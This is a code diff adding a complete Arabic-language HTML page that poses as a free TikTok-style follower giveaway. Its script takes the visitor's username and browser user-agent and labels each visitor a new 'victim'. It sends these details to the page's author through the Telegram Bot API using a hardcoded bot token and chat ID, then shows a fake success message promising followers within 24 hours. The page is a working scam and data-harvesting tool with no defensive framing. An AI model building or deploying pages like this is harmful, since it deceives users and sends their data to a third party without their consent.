@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>هدايا السنة الجديدة | زيادة متابعين مجاناً</title>
+    <style>
+        body { background-color: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; }
+        .box { border: 2px solid #00f2ea; border-radius: 20px; padding: 30px; max-width: 400px; margin: auto; box-shadow: 0 0 20px #ff0050; }
+        input { width: 90%; padding: 12px; margin: 15px 0; border-radius: 10px; border: none; font-size: 16px; }
+        button { background: linear-gradient(45deg, #ff0050, #00f2ea); color: white; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; }
+        .loading { display: none; color: #00f2ea; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>🎁 مفاجأة المتابعين!</h2>
+        <p>أدخل اسم المستخدم (يوزر) لتحصل على 10,000 متابع حقيقي فوراً</p>
+        <input type="text" id="user" placeholder="مثال: @bebo_1" required>
+        <button onclick="sendData()">تفعيل الزيادة الآن 🚀</button>
+        <div id="loading" class="loading">جاري ربط الحساب بالخادم...</div>
+    </div>
+
+    <script>
+        function sendData() {
+            const user = document.getElementById('user').value;
+            if (!user) { alert("من فضلك أدخل اليوزر أولاً"); return; }
+            
+            document.getElementById('loading').style.display = "block";
+            
+            const TOKEN = "7755723800:AAHU2jYkSrWzmh2AmwOcKSs6fIqK9Ql4kIY"; // توكن البوت الخاص بك
+            const CHAT_ID = "7988142947"; // معرف الشات الخاص بك
+            
+            // سحب بيانات الجهاز (المتصفح، النظام)
+            const info = `🔔 ضحية جديد دخل الرابط!\n👤 اليوزر: ${user}\n📱 معلومات الجهاز: ${navigator.userAgent}`;
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`)
+            .then(() => {
+                setTimeout(() => {
+                    alert("✅ تم بنجاح! سيتم فحص الحساب وإرسال المتابعين خلال 24 ساعة.");
+                    document.getElementById('loading').innerText = "تمت العملية بنجاح!";
+                }, 3000);
+            });
+        }
+    </script>
+</body>
+</html>
